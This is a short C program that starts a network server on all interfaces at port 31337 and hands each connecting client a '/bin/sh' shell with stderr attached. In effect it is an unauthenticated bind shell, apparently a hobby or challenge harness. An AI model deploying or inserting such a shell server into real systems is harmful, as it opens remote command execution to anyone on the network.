#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include "server.h"
#include "util.h"

int main() {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(31337);
    addr.sin_addr.s_addr = inet_addr("0.0.0.0");

    struct server_info sinfo;
    sinfo.addr = (struct sockaddr*) &addr;
    sinfo.timeout = 5;
    sinfo.backlog = 10;
    sinfo.pipe_stderr = true;
    char* const pepega_argv[] = {"/bin/sh", NULL};
    sinfo.argv = pepega_argv;
    sinfo.show_dc_msg = true;

    puts("Starting server...");
    start_server(&sinfo);
}
